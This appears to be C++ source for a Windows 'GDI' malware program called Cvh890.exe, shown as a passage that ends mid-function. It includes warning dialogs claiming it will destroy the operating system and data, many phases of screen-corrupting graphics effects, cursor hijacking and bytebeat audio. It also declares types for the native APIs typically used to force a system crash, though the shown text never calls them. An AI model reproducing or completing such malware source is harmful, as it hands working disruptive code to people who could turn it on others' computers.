#pragma comment(lib, "winmm.lib")
#include <windows.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <algorithm>

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// ============================================================================
// КАСТОМНЫЕ СТРУКТУРЫ ДЛЯ ПОПИКСЕЛЬНЫХ ШЕЙДЕРОВ
// ============================================================================
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL_CHV;

typedef union _RGBQUAD_CHV {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE Reserved;
    };
} RGBQUAD_CHV, *PRGBQUAD_CHV;

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
// ============================================================================
// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ И СИНХРОНИЗАЦИЯ ФАЗ
// ============================================================================
int w = 0, h = 0;
volatile bool isSoundPlaying = true;

volatile bool isPhase2Playing = false; volatile bool isPhase3Playing = false;
volatile bool isPhase4Playing = false; volatile bool isPhase6Playing = false;
volatile bool isPhase7Playing = false; volatile bool isPhase8Playing = false;
volatile bool isPhase9Playing = false; volatile bool isPhase10Playing = false;
volatile bool isPhase11Playing = false; volatile bool isPhase12Playing = false;

float ballX = 200.0f, ballY = 200.0f; float ballDX = 7.0f, ballDY = 5.0f;
float hueCounter = 0.0f; int plasmaTime = 0;

int phase2Time = 0; float miniX = 100.0f, miniY = 100.0f; float miniDX = 8.0f, miniDY = 6.0f;
int miniW = 250; int miniH = 150; 

int phase6Time = 0; float ball6X = 300.0f, ball6Y = 300.0f; float ball6DX = 9.0f, ball6DY = 7.0f;
float hueCounter6 = 0.5f;

int phase9Time = 0; int phase10Time = 0;
double waterAngle = 0;
// ============================================================================
// ОБЯЗАТЕЛЬНЫЕ ПРОТОТИПЫ ВСЕХ ФУНКЦИЙ ПРОЕКТА
// ============================================================================
void RefreshScreenClean();
COLORREF ConvertHslToRgb(float h, float s, float l);
HSL_CHV rgb2hsl_chv(RGBQUAD rgb);
RGBQUAD hsl2rgb_chv(HSL_CHV hsl);
bool ShowStartWarnings();
void FlyCursor();
void DrawDistortedCurves(HDC hdc);
void DrawXorPlasma(HDC hdc);
void DrawBouncingBittenCircle(HDC hdc);
void AdvancedScreenDistortion(HDC hdc);
void ColorChannelHell(HDC hdc);
void DrawIconsAndText(HDC hdc);
void DrawFullscreenWidthXorPlasma(HDC hdc);
void DrawFlyingMiniScreen(HDC hdc);
void DrawPhase3ScreenGlitch(HDC hdc);
void DrawPhase3TextOut(HDC hdc);
void DrawPhase4FractalShader(HDC hdc, HDC hdcCopy, RGBQUAD* rgbquad, int& frameIndex);
void DrawPhase6Mosaic(HDC hdc);
void DrawPhase6RotateAndZoom(HDC hdc);
void DrawPhase6BouncingCircle(HDC hdc);
void DrawPhase7ColorShift(HDC hdc, HDC hdcMem, PRGBQUAD_CHV rgbScreen);
void DrawPhase7PlgBltStorm(HDC hdc);
void DrawPhase8PatBlt(HDC hdc);
void DrawPhase9WaterMirrorShader(HDC hdc, HDC hdcCopy, BYTE* dataBytes);
void DrawPhase10WavyPlasma(HDC hdc, HDC hdcCopy, RGBQUAD* rgbquad);
void DrawPhase11ProfectStorm(HDC hdc);
void DrawPhase12SpamText(HDC hdc);
void RefreshScreenClean() { 
    InvalidateRect(NULL, NULL, TRUE); 
    UpdateWindow(GetDesktopWindow()); 
}

COLORREF ConvertHslToRgb(float h, float s, float l) {
    if (s == 0) return RGB((int)(l * 255), (int)(l * 255), (int)(l * 255));
    float q = (l < 0.5f) ? (l * (1.0f + s)) : (l + s - l * s);
    float p = 2.0f * l - q;
    float t[3] = { h + 1.0f / 3.0f, h, h - 1.0f / 3.0f };
    int rgb[3] = { 0, 0, 0 };
    for (int i = 0; i < 3; i++) {
        if (t[i] < 0) t[i] += 1.0f;
        if (t[i] > 1.0f) t[i] -= 1.0f;
        if (t[i] < 1.0f / 6.0f) rgb[i] = (int)((p + (q - p) * 6.0f * t[i]) * 255);
        else if (t[i] < 1.0f / 2.0f) rgb[i] = (int)(q * 255);
        else if (t[i] < 2.0f / 3.0f) rgb[i] = (int)((p + (q - p) * (2.0f / 3.0f - t[i]) * 6.0f) * 255);
        else rgb[i] = (int)(p * 255);
    }
    return RGB(rgb[0], rgb[1], rgb[2]);
}

HSL_CHV rgb2hsl_chv(RGBQUAD rgb) {
    HSL_CHV hsl;
    FLOAT _r = (FLOAT)rgb.rgbRed / 255.f; FLOAT _g = (FLOAT)rgb.rgbGreen / 255.f; FLOAT _b = (FLOAT)rgb.rgbBlue / 255.f;
    FLOAT rgbMin = std::min(std::min(_r, _g), _b); FLOAT rgbMax = std::max(std::max(_r, _g), _b); FLOAT fDelta = rgbMax - rgbMin;
    FLOAT h = 0.f, s = 0.f, l = (FLOAT)((rgbMax + rgbMin) / 2.f);
    if (fDelta != 0.f) {
        s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
        FLOAT deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
        FLOAT deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
        FLOAT deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
        if (_r == rgbMax) h = deltaB - deltaG; else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB; else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
        if (h < 0.f) h += 1.f; if (h > 1.f) h -= 1.f;
    }
    hsl.h = h; hsl.s = s; hsl.l = l; return hsl;
}

RGBQUAD hsl2rgb_chv(HSL_CHV hsl) {
    RGBQUAD rgb; FLOAT r = hsl.l, g = hsl.l, b = hsl.l;
    FLOAT h = hsl.h, sl = hsl.s, l = hsl.l; FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
    if (v > 0.f) {
        FLOAT m = l + l - v; FLOAT sv = (v - m) / v; h *= 6.f; INT sextant = (INT)h; FLOAT fract = h - sextant; FLOAT vsf = v * sv * fract; FLOAT mid1 = m + vsf; FLOAT mid2 = v - vsf;
        switch (sextant) {
            case 0: r = v; g = mid1; b = m; break; case 1: r = mid2; g = v; b = m; break; case 2: r = m; g = v; b = mid1; break; case 3: r = m; g = mid2; b = v; break; case 4: r = mid1; g = m; b = v; break; case 5: r = v; g = m; b = mid2; break;
        }
    }
    rgb.rgbRed = (BYTE)(r * 255.f); rgb.rgbGreen = (BYTE)(g * 255.f); rgb.rgbBlue = (BYTE)(b * 255.f); return rgb;
}

bool ShowStartWarnings() {
    int msg1 = MessageBoxA(NULL, "Run malware? For not epileptics!", "Cvh890.exe", MB_YESNO | MB_ICONQUESTION | MB_SYSTEMMODAL);
    if (msg1 == IDNO) return false;
    int msg2 = MessageBoxA(NULL, "LAST WARNING! THIS WILL DESTROY OPERATING SYSTEM AND YOUR DATA! STILL EXECUTE?", "Cvh890.exe", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
    if (msg2 == IDYES) { Sleep(3000); return true; }
    return false;
}
void FlyCursor() {
    int cursorX = (int)((sin(clock() * 0.005f) + 1.0f) * 0.5f * w); int cursorY = (int)((cos(clock() * 0.003f) + 1.0f) * 0.5f * h); SetCursorPos(cursorX, cursorY);
}

void DrawDistortedCurves(HDC hdc) {
    HPEN hPen = CreatePen(PS_SOLID, rand() % 3 + 1, RGB(rand() % 256, rand() % 256, rand() % 256)); HPEN hOldPen = (HPEN)SelectObject(hdc, hPen); int startX = rand() % w; int startY = rand() % h; MoveToEx(hdc, startX, startY, NULL);
    POINT pts[4] = { { startX, startY }, { startX + (rand() % 400 - 200), startY + (rand() % 400 - 200) }, { startX + (rand() % 400 - 200), startY + (rand() % 400 - 200) }, { rand() % w, rand() % h } }; PolyBezier(hdc, pts, 4); SelectObject(hdc, hOldPen); DeleteObject(hPen);
}

void DrawXorPlasma(HDC hdc) {
    int blockW = 200, blockH = 200; int startX = rand() % (w - blockW); int startY = rand() % (h - blockH); plasmaTime++;
    for (int x = 0; x < blockW; x += 4) {
        for (int y = 0; y < blockH; y += 4) {
            int cx = startX + x; int cy = startY + y; float v = sin(cx / 16.0f + plasmaTime * 0.1f) + sin(cy / 16.0f + plasmaTime * 0.1f);
            SetPixel(hdc, cx, cy, RGB(((int)((v + 2.0f) * 64)) ^ 128, ((int)((v + 2.0f) * 64)) ^ 64, ((int)((v + 2.0f) * 64)) ^ 255));
        }
    }
}

void DrawBouncingBittenCircle(HDC hdc) {
    ballX += ballDX; ballY += ballDY; int radius = 80; if (ballX - radius < 0 || ballX + radius > w) ballDX = -ballDX; if (ballY - radius < 0 || ballY + radius > h) ballDY = -ballDY;
    hueCounter += 0.005f; if (hueCounter > 1.0f) hueCounter = 0.0f; COLORREF rainbowColor = ConvertHslToRgb(hueCounter, 1.0f, 0.5f);
    HBRUSH hBrush = CreateSolidBrush(rainbowColor); HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, hBrush); HPEN hPen = CreatePen(PS_SOLID, 2, rainbowColor); HPEN hOldPen = (HPEN)SelectObject(hdc, hPen); int biteAngle = (int)(15 * sin(clock() * 0.01f) + 20);
    Pie(hdc, (int)ballX - radius, (int)ballY - radius, (int)ballX + radius, (int)ballY + radius, (int)ballX + radius, (int)ballY - biteAngle, (int)ballX + radius, (int)ballY + biteAngle); SelectObject(hdc, hOldBrush); SelectObject(hdc, hOldPen); DeleteObject(hBrush); DeleteObject(hPen);
}

void AdvancedScreenDistortion(HDC hdc) {
    phase2Time++; StretchBlt(hdc, -4, -4, w + 8, h + 8, hdc, 0, 0, w, h, SRCCOPY); int rx = rand() % w; int rw = rand() % 150 + 10; BitBlt(hdc, rx, rand() % 8 + 2, rw, h, hdc, rx, 0, SRCCOPY);
    if (phase2Time % 40 == 0) StretchBlt(hdc, w, 0, -w, h, hdc, 0, 0, w, h, SRCCOPY); if (phase2Time % 75 == 0) StretchBlt(hdc, 0, h, w, -h, hdc, 0, 0, w, h, SRCCOPY);
}

void ColorChannelHell(HDC hdc) {
    int blockW = rand() % 300 + 100; int blockH = rand() % 300 + 100; int bx = rand() % (w - blockW); int by = rand() % (h - blockH);
    HDC hdcMem = CreateCompatibleDC(hdc); HBITMAP hBmp = CreateCompatibleBitmap(hdc, blockW, blockH); SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, blockW, blockH, hdc, bx, by, SRCCOPY); if (rand() % 2 == 0) BitBlt(hdc, bx + 10, by, blockW, blockH, hdcMem, 0, 0, SRCPAINT); else BitBlt(hdc, bx - 10, by, blockW, blockH, hdcMem, 0, 0, SRCAND);
    DeleteObject(hBmp); DeleteDC(hdcMem);
}

void DrawIconsAndText(HDC hdc) {
    int rx = rand() % w; int ry = rand() % h; LPCSTR icons[] = { IDI_ERROR, IDI_WARNING, IDI_QUESTION, IDI_INFORMATION }; HICON hIcon = LoadIcon(NULL, icons[rand() % 4]); DrawIcon(hdc, rx, ry, hIcon);
    if (rand() % 5 == 0) {
        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256)); SetBkMode(hdc, TRANSPARENT);
        HFONT hFont = CreateFontA(rand() % 40 + 20, 0, rand() % 360, 0, FW_BOLD, FALSE, FALSE, FALSE, RUSSIAN_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, "Arial");
        HFONT hOldFont = (HFONT)SelectObject(hdc, hFont); TextOutA(hdc, rand() % w, rand() % h, "Cvh890", 6); SelectObject(hdc, hOldFont); DeleteObject(hFont);
    }
}

void DrawFullscreenWidthXorPlasma(HDC hdc) {
    int step = 16; int offset = (phase2Time * 8) % w;
    for (int x = 0; x < w; x += step) {
        for (int y = 0; y < h; y += step) {
            float v = sin((x + offset) / 32.0f) + sin(y / 32.0f) + sin((x + y + offset) / 64.0f);
            SetPixel(hdc, x, y, RGB(((int)((v + 3.0f) * 42)) ^ 64, ((int)((v + 3.0f) * 42)) ^ 255, ((int)((v + 3.0f) * 42)) ^ 128));
        }
    }
}

void DrawFlyingMiniScreen(HDC hdc) {
    miniX += miniDX; miniY += miniDY; if (miniX < 0 || miniX + miniW > w) miniDX = -miniDX; if (miniY < 0 || miniY + miniH > h) miniDY = -miniDY; StretchBlt(hdc, (int)miniX, (int)miniY, miniW, miniH, hdc, 0, 0, w, h, SRCCOPY);
}

void DrawPhase3ScreenGlitch(HDC hdc) { BitBlt(hdc, 1, 1, w, h, hdc, -2, 2, SRCERASE); }
void DrawPhase3TextOut(HDC hdc) {
    LPCWSTR lpText = L"Cvh890.exe"; SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255)); SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255)); TextOutW(hdc, rand() % w, rand() % h, lpText, wcslen(lpText));
}
void DrawPhase4FractalShader(HDC hdc, HDC hdcCopy, RGBQUAD* rgbquad, int& frameIndex) {
    StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
    for (int x = 0; x < w; x += 2) {
        for (int y = 0; y < h; y += 2) {
            int index = y * w + x; double cx = x * (2.5f / w) - 2.f; double cy = y * (1.90f / h) - 0.95f; double zx = 0; double zy = 0; int fx = 0;
            while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                double fczx = zx * zx - zy * zy + cx; double fczy = 2 * zx * zy + cy; zx = fczx; zy = fczy; fx++;
                HSL_CHV hslcolor = rgb2hsl_chv(rgbquad[index]); hslcolor.h = fmod(fx / 300.f + y / (float)h * .1f, 1.f);
                RGBQUAD processedRgb = rgbquad[index] = hsl2rgb_chv(hslcolor); rgbquad[index + 1] = processedRgb;
            }
        }
    }
    frameIndex++; StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY); StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCCOPY); StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCCOPY);
}

void DrawPhase6Mosaic(HDC hdc) {
    int bx = (rand() % (w / 100)) * 100; int by = (rand() % (h / 100)) * 100; HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)); RECT rect = { bx, by, bx + 100, by + 100 }; FillRect(hdc, &rect, brush); DeleteObject(brush);
}

void DrawPhase6RotateAndZoom(HDC hdc) {
    phase6Time++; POINT wPt[3]; double angle = phase6Time * 0.02; int zoom = 15; int sX = 8;
    wPt[0].x = (int)(w/2 + (-w/2+sX)*cos(angle) - (-h/2)*sin(angle)) - zoom; wPt[0].y = (int)(h/2 + (-w/2+sX)*sin(angle) + (-h/2)*cos(angle)) - zoom;
    wPt[1].x = (int)(w/2 + (w/2+sX)*cos(angle) - (-h/2)*sin(angle)) + zoom;   wPt[1].y = (int)(h/2 + (w/2+sX)*sin(angle) + (-h/2)*cos(angle)) - zoom;
    wPt[2].x = (int)(w/2 + (-w/2+sX)*cos(angle) - (h/2)*sin(angle)) - zoom;  wPt[2].y = (int)(h/2 + (-w/2+sX)*sin(angle) + (h/2)*cos(angle)) + zoom;
    PlgBlt(hdc, wPt, hdc, 0, 0, w, h, NULL, 0, 0);
}

void DrawPhase6BouncingCircle(HDC hdc) {
    ball6X += ball6DX; ball6Y += ball6DY; int radius = 90; if (ball6X - radius < 0 || ball6X + radius > w) ball6DX = -ball6DX; if (ball6Y - radius < 0 || ball6Y + radius > h) ball6DY = -ball6DY;
    hueCounter6 += 0.006f; if (hueCounter6 > 1.0f) hueCounter6 = 0.0f; COLORREF rc = ConvertHslToRgb(hueCounter6, 1.0f, 0.5f);
    HBRUSH hB = CreateSolidBrush(rc); HBRUSH hOB = (HBRUSH)SelectObject(hdc, hB); HPEN hP = CreatePen(PS_SOLID, 3, rc); HPEN hOP = (HPEN)SelectObject(hdc, hP); Ellipse(hdc, (int)ball6X - radius, (int)ball6Y - radius, (int)ball6X + radius, (int)ball6Y + radius);
    SelectObject(hdc, hOB); SelectObject(hdc, hOP); DeleteObject(hB); DeleteObject(hP);
}

void DrawPhase7ColorShift(HDC hdc, HDC hdcMem, PRGBQUAD_CHV rgbScreen) {
    BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    for (int i = 0; i < w * h; i += 2) {
        int x = i % w; int y = i / w; rgbScreen[i].r += 5; rgbScreen[i].g += x + y; rgbScreen[i + 1].r = rgbScreen[i].r; rgbScreen[i + 1].g = rgbScreen[i].g;
    }
    BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
}

void DrawPhase7PlgBltStorm(HDC hdc) {
    RECT wRect; POINT wPt[3]; GetWindowRect(GetDesktopWindow(), &wRect); 
    wPt[0].x = wRect.left + 6; wPt[0].y = wRect.top - 6; 
    wPt[1].x = wRect.right + 6; wPt[1].y = wRect.top + 6; 
    wPt[2].x = wRect.left - 6; wPt[2].y = wRect.bottom + 6; 
    PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, NULL, 0, 0);
}

void DrawPhase8PatBlt(HDC hdc) {
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225)); SelectObject(hdc, brush); PatBlt(hdc, 0, 0, w, h, PATINVERT);
    LPCWSTR lpText = L"Cvh890.exe"; SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255)); SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255)); TextOutW(hdc, rand() % w, rand() % h, lpText, wcslen(lpText)); DeleteObject(brush);
}

void DrawPhase9WaterMirrorShader(HDC hdc, HDC hdcCopy, BYTE* dataBytes) {
    phase9Time++; BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY); int v = 0;
    for (int i = 0; w * h > i; i += 2) { if (i % h == 0 && rand() % 100 == 0) v = rand() % 100; dataBytes[4 * i + v] -= 5; }
    for (int y = 0; y < h; y += 4) { int xOffset = (int)(sin(y * 0.05f + phase9Time * 0.2f) * 20); BitBlt(hdc, xOffset, y, w, 4, hdcCopy, 0, y, SRCCOPY); }
    if (phase9Time % 2 == 0) StretchBlt(hdc, w, 0, -w, h, hdc, 0, 0, w, h, SRCCOPY);
}

void DrawPhase10WavyPlasma(HDC hdc, HDC hdcCopy, RGBQUAD* rgbquad) {
    phase10Time++; StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
    for (int x = 0; x < w; x += 3) {
        for (int y = 0; y < h; y += 3) {
            int index = y * w + x;
            int fx = (int)((4 * phase10Time) + ((4 * phase10Time) * sin(x / 24.0f + phase10Time * 0.1f)) + (4 * phase10Time) + ((4 * phase10Time) * sin(y / 16.0f)));
            HSL_CHV hsl = rgb2hsl_chv(rgbquad[index]); hsl.h = fmod(fx / 250.f + y / (float)h * .15f, 1.f);
            rgbquad[index] = hsl2rgb_chv(hsl);
        }
    }
    StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
}

void DrawPhase11ProfectStorm(HDC hdc) {
    BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY); BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY); BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
    HBRUSH brush1 = CreateSolidBrush(RGB(255, 255, 255)); SelectObject(hdc, brush1); BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, MERGECOPY); DeleteObject(brush1);
    HBRUSH brush2 = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)); SelectObject(hdc, brush2); BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT); DeleteObject(brush2);
}

void DrawPhase12SpamText(HDC hdc) {
    SetBkMode(hdc, 0); LPCSTR text1 = "Cvh890.exe"; LPCSTR text2 = "R.I.P PC";
    SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
    HGDIOBJ font = CreateFontA(45, 32, 0, 0, FW_BOLD, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Arial"); SelectObject(hdc, font);
    TextOutA(hdc, rand() % w, rand() % h, text1, (int)strlen(text1)); TextOutA(hdc, rand() % w, rand() % h, text2, (int)strlen(text2));
    DeleteObject(font);
}
DWORD WINAPI ByteBeatPhase1Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 40; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(((9 * t) & (t >> 4)) | ((5 * t) & (t >> 7)) | (((3 * t) & (t >> 10)) - 1) | (t >> 3));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isSoundPlaying = false; return 0;
}

DWORD WINAPI ByteBeatPhase2Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(t * (t >> 5 | t >> 6));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase2Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase3Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(t >> 6 ^ t & t >> 9 ^ t >> 12 | ((t >> 6 | t << 1) + (t >> 5 | t << 3 | t >> 3) | t >> 2 | t << 1));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase3Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase4Thread(LPVOID lpParam) {
    int sRate = 22050; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(9 * (t * ((t >> 9 | t >> 13) & 15) & 16));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase4Playing = false; return 0;
}
DWORD WINAPI ByteBeatPhase6Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(t * (t >> 7) | t * ((t >> 3) | (t >> 1)) & 4);
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase6Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase7Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(150 * (t >> 6 | t | t >> (t >> 16)) + (7 & t >> 11));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase7Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase8Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(t*((t&4096?t%65536<59392?7:t&7:16)+(1&t>>14))>>(3&-t>>(t&2048?2:10))|t>>(t&16384?t&4096?10:3:2));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase8Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase9Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(t * ((t >> 9 | t >> 13) & 25 & t >> 10));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase9Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase10Thread(LPVOID lpParam) {
    int sRate = 11025; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(2 * t & t >> 8 | 5 * t & t >> 7 | 9 * t & t >> 4 | 15 * t & t >> 4);
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
